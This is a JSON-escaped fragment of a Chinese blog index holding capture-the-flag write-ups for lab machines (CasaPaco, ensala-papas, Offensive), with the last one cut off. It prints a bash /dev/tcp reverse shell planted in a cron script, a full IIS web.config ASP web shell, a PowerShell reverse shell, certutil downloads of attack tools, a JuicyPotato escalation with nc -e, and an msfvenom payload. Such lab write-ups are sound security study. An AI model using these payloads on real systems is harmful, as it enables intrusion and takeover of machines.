\u540e\uff0c\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u83b7\u5f97\u7a33\u5b9a\u7684**\u4ea4\u4e92\u5f0f** **TTY shell**\uff1a\n\n```bash\nscript /dev/null -c bash  \nctrl+z  \nstty raw -echo; fg  \nreset xterm  \nexport TERM=xterm  \necho $SHELL  \nexport SHELL=/bin/bash  \nstty rows 59 cols 236\n```\n\n# 4.\u63d0\u6743\n\n```bash\nwww-data@Thehackerslabs-CasaPaco:/var/www/html$ cd /home/\nwww-data@Thehackerslabs-CasaPaco:/home$ ls -la\ntotal 12\ndrwxr-xr-x  3 root        root        4096 Jan 14 16:52 .\ndrwxr-xr-x 18 root        root        4096 Jan 13 14:47 ..\ndrwxr-xr-x  3 pacogerente pacogerente 4096 Jan 14 17:08 pacogerente\nwww-data@Thehackerslabs-CasaPaco:/home$ cd pacogerente/\nwww-data@Thehackerslabs-CasaPaco:/home/pacogerente$ ls -al\ntotal 36\ndrwxr-xr-x 3 pacogerente pacogerente 4096 Jan 14 17:08 .\ndrwxr-xr-x 3 root        root        4096 Jan 14 16:52 ..\nlrwxrwxrwx 1 root        root           9 Jan 14 16:58 .bash_history -> /dev/null\n-rw-r--r-- 1 pacogerente pacogerente  220 Mar 29  2024 .bash_logout\n-rw-r--r-- 1 pacogerente pacogerente 3526 Mar 29  2024 .bashrc\ndrwxr-xr-x 3 pacogerente pacogerente 4096 Jan 13 20:24 .local\n-rw-r--r-- 1 pacogerente pacogerente  807 Mar 29  2024 .profile\n-rwxrw-rw- 1 pacogerente pacogerente  110 Jan 14 16:57 fabada.sh\n-rw-r--r-- 1 root        root        2417 Jan 15 03:06 log.txt\n-rw-r--r-- 1 pacogerente pacogerente   33 Jan 14 17:06 user.txt\nwww-data@Thehackerslabs-CasaPaco:/home/pacogerente$ cat fabada.sh\n#!/bin/bash\n\n# Generar un log de actividad\necho 'Ejecutado por cron el: $(date)' >> /home/pacogerente/log.txt\n\n```\n\n\u5199\u4e2a\u811a\u672c\u8986\u76d6\u6389`fabada.sh`\u5c31\u884c\u4e86\uff08\u4e0d\u8981\u95ee\u6211\u4e3a\u4ec0\u4e48\u4e0d\u770b`pspy`\uff0c\u6211\u770b\u5b83\u957f\u7684\u90fd\u50cf\u5b9a\u65f6\u4efb\u52a1\u261d( \u25e0\u203f\u25e0 )\u261d\uff09\n\n```bash\nwww-data@Thehackerslabs-CasaPaco:/home/pacogerente$ echo -e '#!/bin/bash\\n/bin/bash -i >& /dev/tcp/192.168.205.141/8889 0>&1' > fabada.\nwww-data@Thehackerslabs-CasaPaco:/home/pacogerente$ cat fabada.sh \n#!/bin/bash\n/bin/bash -i >& /dev/tcp/192.168.205.141/8889 0>&1\n```\n\n\u7b49\u4e00\u4f1a\uff0c\u5b83\u5b9a\u65f6\u633a\u5feb\u7684\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc -lvnp 8889\nlistening on [any] 8889 ...\niconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.137] 42802\nbash: no se puede establecer el grupo de proceso de terminal (4096): Funci\u00f3n ioctl no apropiada para el dispositivo\nbash: no hay control de trabajos en este shell\nroot@Thehackerslabs-CasaPaco:~# d\nid\nuid=0(root) gid=0(root) grupos=0(root)\n\n```\n\n\u4e0b\u73edsentence", "top": 0, "createdAt": 1751016830, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P118": {"htmlDir": "docs/post/thl_ensala-papas.html", "labels": ["thehackerlabs"], "postTitle": "thl_ensala-papas", "postUrl": "post/thl_ensala-papas.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/118", "commentNum": 0, "wordCount": 16217, "description": "# thl_ensala-papas\n\n# 0.\u7b80\u4ecb\n\n**\u9776\u673a**\uff1a[thehackerslabs - ensala-papas](https://thehackerslabs.com/ensala-papas/)\n**\u96be\u5ea6**\uff1a\u521d\u5b66\u8005\n**\u76ee\u6807 IP**\uff1a192.168.205.221\n**\u672c\u673a IP**\uff1a192.168.205.141\n\n---\n\n# 1.\u626b\u63cf\n\n`nmap`\u8d77\u624b\uff0c\u5148\u63a2\u6d4b\u7aef\u53e3\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.221\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:17 CST\nNmap scan report for 192.168.205.221\nHost is up (0.00068s latency).\nNot shown: 65523 closed tcp ports (reset)\nPORT      STATE    SERVICE\n80/tcp    open     http\n135/tcp   open     msrpc\n139/tcp   open     netbios-ssn\n445/tcp   open     microsoft-ds\n3167/tcp  filtered nowcontact\n47001/tcp open     winrm\n49152/tcp open     unknown\n49153/tcp open     unknown\n49154/tcp open     unknown\n49155/tcp open     unknown\n49156/tcp open     unknown\n49157/tcp open     unknown\nMAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 11.77 seconds\n                                                                   \n```\n\n\u518d\u63a2\u6d4b\u8be6\u7ec6\u670d\u52a1\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sV -sT -O -Pn -n -p80,135,139,445,47001,49152,49153,49154,49155,49156,49157 192.168.205.221\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:19 CST\nNmap scan report for 192.168.205.221\nHost is up (0.00046s latency).\n\nPORT      STATE SERVICE       VERSION\n80/tcp    open  http          Microsoft IIS httpd 7.5\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds?\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n49152/tcp open  msrpc         Microsoft Windows RPC\n49153/tcp open  msrpc         Microsoft Windows RPC\n49154/tcp open  msrpc         Microsoft Windows RPC\n49155/tcp open  msrpc         Microsoft Windows RPC\n49156/tcp open  msrpc         Microsoft Windows RPC\n49157/tcp open  msrpc         Microsoft Windows RPC\nMAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Microsoft Windows 7|2008|8.1\nOS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1\nOS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1\nNetwork Distance: 1 hop\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 60.00 seconds\n                                                                \n```\n\n\u63a2\u6d4bUDP\u670d\u52a1\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sU -n -T4 --top-ports 100 192.168.205.221 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:27 CST\nNmap scan report for 192.168.205.221\nHost is up (0.00048s latency).\nNot shown: 62 closed udp ports (port-unreach), 37 open|filtered udp ports (no-response)\nPORT    STATE SERVICE\n137/udp open  netbios-ns\nMAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 69.21 seconds\n```\n\n\u4f7f\u7528`nmap`\u626b\u63cf\u6f0f\u6d1e\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap --script=vuln -p80,135,139,445,47001,49152,49153,49154,49155,49156,49157 192.168.205.221\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:24 CST\nNmap scan report for 192.168.205.221\nHost is up (0.00056s latency).\n\nPORT      STATE SERVICE\n80/tcp    open  http\n|_http-csrf: Couldn't find any CSRF vulnerabilities.\n|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.\n|_http-dombased-xss: Couldn't find any DOM based XSS.\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n47001/tcp open  winrm\n49152/tcp open  unknown\n49153/tcp open  unknown\n49154/tcp open  unknown\n49155/tcp open  unknown\n49156/tcp open  unknown\n49157/tcp open  unknown\nMAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)\n\nHost script results:\n|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR\n|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR\n|_smb-vuln-ms10-054: false\n\nNmap done: 1 IP address (1 host up) scanned in 148.15 seconds\n                                              \n```\n\n\u76ee\u524d\u4e3a\u6b62\uff0c\u611f\u5174\u8da3\u7684\u7aef\u53e3\u6709 **80**\u3001**445\uff0c**  windwos\u7684\u9776\u673a445\u7684\u4f18\u5148\u7ea7\u9ad8\u4e8e80\uff0c\u6240\u4ee5\u6211\u4eec\u5148\u6d4b\u8bd5445\u7aef\u53e3\u6709\u6ca1\u6709\u5229\u7528\u70b9\n\n---\n\n# 2.\u8e29\u70b9\n\n## 2.1 port 445\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ netexec smb 192.168.205.221 -u guest -p '' --shares\nSMB         192.168.205.221 445    WIN-4QU3QNHNK7E  [*] Windows 6.1 Build 7600 x64 (name:WIN-4QU3QNHNK7E) (domain:WIN-4QU3QNHNK7E) (signing:False) (SMBv1:False)                                                                                                            \nSMB         192.168.205.221 445    WIN-4QU3QNHNK7E  [-] WIN-4QU3QNHNK7E\\guest: STATUS_LOGON_FAILURE \n                                                                                                    \n```\n\n\u5b83\u6ca1\u6709\u5f00\u653e\u8bbf\u5ba2\u767b\u5f55\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u53bb\u89c2\u5bdf80\u7aef\u53e3\u4e86\n\n## 2.2 port 80\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ gobuster dir -u http://192.168.205.221 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x aspx,asp,html,txt,md -b 404\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.205.221\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              asp,html,txt,md,aspx\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/*checkout*.aspx      (Status: 400) [Size: 20]\n/zoc.aspx             (Status: 200) [Size: 1159]\n/*docroot*.aspx       (Status: 400) [Size: 20]\n/*.aspx               (Status: 400) [Size: 20]\n/http%3A%2F%2Fwww.aspx (Status: 400) [Size: 20]\n/**http%3a.aspx       (Status: 400) [Size: 20]\n/q%26a.aspx           (Status: 400) [Size: 20]\n/http%3A.aspx         (Status: 400) [Size: 20]\n/*http%3A.aspx        (Status: 400) [Size: 20]\n/http%3A%2F%2Fyoutube.aspx (Status: 400) [Size: 20]\n/http%3A%2F%2Fblogs.aspx (Status: 400) [Size: 20]\nProgress: 345575 / 7642998 (4.52%)^C\n[!] Keyboard interrupt detected, terminating.\nProgress: 345933 / 7642998 (4.53%)\n===============================================================\nFinished\n===============================================================\n\n```\n\n\u626b\u5230\u4e00\u4e2a`/zoc.aspx`\uff0c\u53bb\u6d4f\u89c8\u5668\u67e5\u770b\u4e86\u4e00\u4e0b\uff0c\u662f\u4e00\u4e2a\u4e0a\u4f20\u9875\uff0c\u5e76\u5728\u6ce8\u91ca\u53d1\u73b0\u4e86\u4e00\u4e2a\u76ee\u5f55\u8def\u5f84`/Subiditosdetono/`\uff0c\u5f53\u6211\u4eec\u628a\u76ee\u5f55\u52a0\u5165\u7f51\u5740\u4f1a\u770b\u5230\u5982\u4e0b\u5185\u5bb9\n\n![image](https://github.com/user-attachments/assets/b3e461b5-23c7-4dfc-b908-ba7fea785815)\n\n\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6709\u4e00\u4e2a`config`\u6587\u4ef6\uff0c\u5f53\u6211\u4eec\u70b9\u51fb\u65f6\u4f1a\u53d1\u73b0**404**\u65e0\u6cd5\u8bbf\u95ee\uff0c\u90a3\u6211\u4eec\u8fd8\u662f\u56de\u4e0a\u4f20\u9875\u8bd5\u8bd5\u80fd\u4e0d\u80fd\u4e0a\u4f20**shell**\n\n![image](https://github.com/user-attachments/assets/bd39753c-d756-4346-b2a8-d921cc8ecfd2)\n\n\u4e0d\u5141\u8bb8\u6211\u4eec\u4e0a\u4f20`.aspx`\u540e\u7f00\u7684\u6587\u4ef6\uff0c\u6839\u636e\u4e4b\u524d\u8bbf\u95ee`/Subiditosdetono/`\u770b\u5230\u6709`config`\u6587\u4ef6\uff0c\u6211\u4eec\u53ef\u4ee5\u4ece\u4e2d\u77e5\u9053\uff0c\u53ef\u4ee5\u4e0a\u4f20`config`\u6587\u4ef6\uff0c\u6211\u4eec\u53bb[hacktricks](https://book.hacktricks.xyz/)\u641c\u7d22\u4e00\u4e0b\u770b`config`\u6587\u4ef6\u53ef\u4e0d\u53ef\u4ee5\u505a`shell`\n\n![image](https://github.com/user-attachments/assets/3d2656b4-ae69-493a-b8f7-8e99ea490bdd)\n\n\u627e\u5230\u4e86\u4e00\u70b9\u6709\u610f\u601d\u7684\u4e1c\u897f\uff0c\u6211\u4eec\u628a\u5b83\u7684\u793a\u4f8b[\u590d\u5236](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)\u4e0b\u6765\uff0c\u4e0a\u4f20\u8fd0\u884c\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat web.config \n<?xml version='1.0' encoding='UTF-8'?>\n<configuration>\n   <system.webServer>\n      <handlers accessPolicy='Read, Script, Write'>\n         <add name='web_config' path='*.config' verb='*' modules='IsapiModule' scriptProcessor='%windir%\\system32\\inetsrv\\asp.dll' resourceType='Unspecified' requireAccess='Write' preCondition='bitness64' />       \n      </handlers>\n      <security>\n         <requestFiltering>\n            <fileExtensions>\n               <remove fileExtension='.config' />\n            </fileExtensions>\n            <hiddenSegments>\n               <remove segment='web.config' />\n            </hiddenSegments>\n         </requestFiltering>\n      </security>\n   </system.webServer>\n</configuration>\n<!--\n<% Response.write('-'&'->')%>\n<%\nSet oScript = Server.CreateObject('WSCRIPT.SHELL')\nSet oScriptNet = Server.CreateObject('WSCRIPT.NETWORK')\nSet oFileSys = Server.CreateObject('Scripting.FileSystemObject')\n\nFunction getCommandOutput(theCommand)\n    Dim objShell, objCmdExec\n    Set objShell = CreateObject('WScript.Shell')\n    Set objCmdExec = objshell.exec(thecommand)\n\n    getCommandOutput = objCmdExec.StdOut.ReadAll\nend Function\n%>\n\n<BODY>\n<FORM action='' method='GET'>\n<input type='text' name='cmd' size=45 value='<%= szCMD %>'>\n<input type='submit' value='Run'>\n</FORM>\n\n<PRE>\n<%= '\\\\' & oScriptNet.ComputerName & '\\' & oScriptNet.UserName %>\n<%Response.Write(Request.ServerVariables('server_name'))%>\n<p>\n<b>The server's port:</b>\n<%Response.Write(Request.ServerVariables('server_port'))%>\n</p>\n<p>\n<b>The server's software:</b>\n<%Response.Write(Request.ServerVariables('server_software'))%>\n</p>\n<p>\n<b>The server's software:</b>\n<%Response.Write(Request.ServerVariables('LOCAL_ADDR'))%>\n<% szCMD = request('cmd')\nthisDir = getCommandOutput('cmd /c' & szCMD)\nResponse.Write(thisDir)%>\n</p>\n<br>\n</BODY>\n\n\n\n<%Response.write('<!-'&'-') %>\n-->\n        \n```\n\n![image](https://github.com/user-attachments/assets/2ab0ece6-4187-4cc6-93dd-610a3eb4cfdc)\n\n\u5f39\u4e2a**shell**\u56de\u6765\n\n```bash\npowershell -nop -c '$client = New-Object System.Net.Sockets.TCPClient('192.168.205.141',8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'\n\n#\u653b\u51fb\u673a\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/netcat]\n\u2514\u2500$ nc -lvnp 8888\nlistening on [any] 8888 ...\nconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.221] 49159\nwhoami\nwin-4qu3qnhnk7e\\info\n```\n\n---\n\n# 3.\u63d0\u6743\n\n\u62ff\u5230**shell**\u540e\u770b\u770b\u6743\u9650\n\n```bash\nPS C:\\users\\info> whoami /priv\n\nINFORMACI?N DE PRIVILEGIOS\n--------------------------\n\nNombre de privilegio          Descripci?n                                  Estado     \n============================= ============================================ =============\nSeChangeNotifyPrivilege       Omitir comprobaci?n de recorrido             Habilitada   \nSeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci?n Habilitada   \nSeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Deshabilitado\n\n```\n\n\u6211\u4eec\u6709 `SeImpersonatePrivilege`\u6743\u9650\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 **[JuicyPotato](https://github.com/ohpe/juicy-potato)** \u5de5\u5177\u6765\u63d0\u5347\u6743\u9650\u3002\n\n![image](https://github.com/user-attachments/assets/18a9bc24-472b-4771-bf45-70707157ece7)\n\n```bash\nPS C:\\tmp> certutil.exe -urlcache -split -f http://192.168.205.141:8000/nc.exe nc.exe\n****  En l?nea  ****\n  0000  ...\n  e800\nCertUtil: -URLCache comando completado correctamente.\nPS C:\\tmp> dir\n\n\n    Directorio: C:\\tmp\n\n\nMode                LastWriteTime     Length Name                            \n----                -------------     ------ ----                            \n-a---        02/01/2025     15:19      59392 nc.exe                          \n\n\nPS C:\\tmp> certutil.exe -urlcache -split -f http://192.168.205.141:8000/JuicyPotato.exe JuicyPotato.exe\n****  En l?nea  ****\n  000000  ...\n  054e00\nCertUtil: -URLCache comando completado correctamente.\nPS C:\\tmp> dir\n\n\n    Directorio: C:\\tmp\n\n\nMode                LastWriteTime     Length Name                            \n----                -------------     ------ ----                            \n-a---        02/01/2025     15:22     347648 JuicyPotato.exe                 \n-a---        02/01/2025     15:19      59392 nc.exe                          \n\n\n\n```\n\n\u5148\u5c06`JuicyPotato.exe`\u548c`nc.exe`\u4f20\u4e0a\u76ee\u6807\u673a\u5668\n\n```bash\n./JuicyPotato.exe -t * -p C:\\Windows\\System32\\cmd.exe -l 1337 -a '/c C:\\tmp\\nc.exe -e cmd 192.168.205.141 4567' -c '{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}'\n```\n\n\u8fd0\u884c`JuicyPotato.exe`\n\n```bash\n\u2514\u2500$ nc -lvnp 4567    \nlistening on [any] 4567 ...\nconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.221] 49176\nMicrosoft Windows [Versi\ufffdn 6.1.7600]\nCopyright (c) 2009 Microsoft Corporation. Reservados todos los derechos.\nC:\\Windows\\system32>whoami\nwhoami\nnt authority\\system\n\n```\n\n\u6210\u529f\u62ff\u5230**system**\u6743\u9650\n\n---\n\n# 4.\u603b\u7ed3\n\n\u5728`BerserkWings`\u3001`ll104567`\u5927\u4f6c\u90a3\u5b66\u4e86\u70b9\u6280\u672f[\u7b11\u8138]\n\n## 4.1 \u5206\u6790 SMB \u670d\u52a1\n\n**\u68c0\u67e5\u57df**\u3001**\u64cd\u4f5c\u7cfb\u7edf\u7248\u672c**\u3001**\u662f\u5426\u53ef\u4ee5\u8bbf\u5ba2\u767b\u5f55**\u7b49\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ crackmapexec smb 192.168.205.221\nSMB         192.168.205.221 445    WIN-4QU3QNHNK7E  [*] Windows 6.1 Build 7600 x64 (name:WIN-4QU3QNHNK7E) (domain:WIN-4QU3QNHNK7E) (signing:False) (SMBv1:False)\n                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ netexec smb 192.168.205.221                    \nSMB         192.168.205.221 445    WIN-4QU3QNHNK7E  [*] Windows 6.1 Build 7600 x64 (name:WIN-4QU3QNHNK7E) (domain:WIN-4QU3QNHNK7E) (signing:False) (SMBv1:False)                                                                                                          \n                          \n```\n\n\u5217\u51fa\u4e0e **smblcient** \u5171\u4eab\u7684\u6587\u4ef6\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ smbclient -L //192.168.205.221// -N\nAnonymous login successful\n\n        Sharename       Type      Comment\n        ---------       ----      -------\nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 192.168.205.221 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available                                                         \n```\n\n\u81ea\u52a8\u5316\u811a\u672c\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ smbmap -H 192.168.205.221        \n\n    ________  ___      ___  _______   ___      ___       __         _______\n   /'       )|'  \\    /'  ||   _  '\\ |'  \\    /'  |     /''\\       |   __ '\\\n  (:   \\___/  \\   \\  //   |(. |_)  :) \\   \\  //   |    /    \\      (. |__) :)\n   \\___  \\    /\\  \\/.    ||:     \\/   /\\   \\/.    |   /' /\\  \\     |:  ____/\n    __/  \\   |: \\.        |(|  _  \\  |: \\.        |  //  __'  \\    (|  /\n   /' \\   :) |.  \\    /:  ||: |_)  :)|.  \\    /:  | /   /  \\   \\  /|__/ \\\n  (_______/  |___|\\__/|___|(_______/ |___|\\__/|___|(___/    \\___)(_______)\n-----------------------------------------------------------------------------\nSMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com\n                     https://github.com/ShawnDEvans/smbmap\n\n[*] Detected 1 hosts serving SMB                                                                                                \n[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                        \n[!] Access denied on 192.168.205.221, no fun for you...                                                                \n[*] Closed 1 connections                                                                                                   \n                                  \n```\n\n## 4.2 windows\u5e38\u7528\u547d\u4ee4\n\n```bash\n# \u67e5\u770b\u64cd\u4f5c\u7cfb\u7edf \uff08OS\uff09 \u4fe1\u606f\nsysteminfo\n# \u67e5\u770b\u62e5\u6709\u6743\u9650\nwhoami /priv\n# \u4e0b\u8f7d\u653b\u51fb\u673a\u6587\u4ef6\ncopy \\\\192.168.205.141\\nc.exe .\n```\n\n## 4.3 msf\n\n\u751f\u6210**shell**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.205.141 LPORT=4444 f exe -o msf.exe \n\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 354 bytes\nSaved as: msf.exe\n\n```\n\n\u8fde\u63a5**shell**\n\n```bash\nmsf6 > use exploit/multi/handler \n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\n```\n\n\u81ea\u52a8\u5316\u6f0f\u6d1e\u6316\u6398\uff08\u8981\u6709msf\u7684shell\uff09\n\n```bash\nmsf6 > post/multi/recon/local_exploit_suggester\n```sentence", "top": 0, "createdAt": 1751016833, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P119": {"htmlDir": "docs/post/thl_Offensive.html", "labels": ["thehackerlabs"], "postTitle": "thl_Offensive", "postUrl": "post/thl_Offensive.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/119", "commentNum": 0, "wordCount": 32326, "description": "# thl_Offensive\n\n**\u9776\u673a**\uff1a[thehackerslabs - offensive](https://thehackerslabs.com/offensive/)\n**\u96be\u5ea6**\uff1a\u4e13\u4e1a\uff08PROFESIONAL\uff09\n**\u76ee\u6807 IP**\uff1a192.168.205.220\n**\u672c\u673a IP**\uff1a192.168.205.141\n\n---\n\n## 1. \u7aef\u53e3\u679a\u4e3e\u53ca\u670d\u52a1\u63a2\u6d4b\n\n\u9996\u5148\uff0c\u4f7f\u7528 `nmap` \u626b\u63cf\u76ee\u6807 IP \u7684\u5f00\u653e\u7aef\u53e3\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sV -sT -O -Pn -n -p- 192.168.205.220\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-01 11:32 CST\nNmap scan report for 192.168.205.220\nHost is up (0.00034s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)\n80/tcp   open  http    Apache httpd 2.4.62 ((Debian))\n8080/tcp open  http    Node.js Express framework\nMAC Address: 08:00:27:B1:A8:86 (Oracle VirtualBox virtual NIC)\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 10.68 seconds\n```\n\n\u4ece `nmap` \u626b\u63cf\u7ed3\u679c\u6765\u770b\uff0c\u76ee\u6807\u673a\u5668\u5f00\u653e\u4e86 **22** (SSH) \u3001 **80** (HTTP) \u7aef\u53e3\u3001**8080**(HTTP) \u7aef\u53e3\u3002\n\n\u5176\u4e2d80\u662f**Apache httpd 2.4.62**\u7684\u670d\u52a1\uff0c8080\u662f**Node.js \u67b6\u6784**\uff0c\u6211\u4eec\u4e0a\u53bb\u7f51\u9875\u770b\u770b\n\n---\n\n## 2.\u8e29\u70b9\n\n### 80\u7aef\u53e3\n\n![image](https://github.com/user-attachments/assets/819ee2bc-b088-4fae-bf3a-085e6092abf4)\n\n\u660e\u663e\u53ef\u4ee5\u770b\u51fa\u6709\u4e00\u4e2a\u57df\u540d`offensive.thl`\u52a0\u5165\u6211\u4eec\u7684hosts\u6587\u4ef6\u4e2d\uff0c\u7ee7\u7eed\u8e29\u70b9\u53ef\u4ee5\u53d1\u73b0\uff0c\u8fd9\u4e2a\u7f51\u9875\u662f\u4e2a\u535a\u5ba2\uff0c\u90a3\u6211\u4eec\u63a2\u6d4b\u4e00\u4e0b\u67b6\u6784\u3002\n\n```bash\n\u2514\u2500$ whatweb http://offensive.thl/       \nhttp://offensive.thl/ [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[192.168.205.220], MetaGenerator[WordPress 6.7.1], Script, Title[rodgar], UncommonHeaders[link], WordPress[6.7.1]\n\n```\n\n\u662f**WordPress 6.7.1**\u7684\uff0c\u6211\u4eec\u5229\u7528**wpscan**\u8fdb\u884c\u63a2\u6d4b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ wpscan --url http://offensive.thl -e vp,u --api-token xxx   #api-token\u6ce8\u518cwpscan\u5b98\u7f51\u83b7\u53d6\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ \u00ae\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.27\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://offensive.thl/ [192.168.205.220]\n[+] Started: Wed Jan  1 12:51:58 2025\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entry: Server: Apache/2.4.62 (Debian)\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://offensive.thl/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - 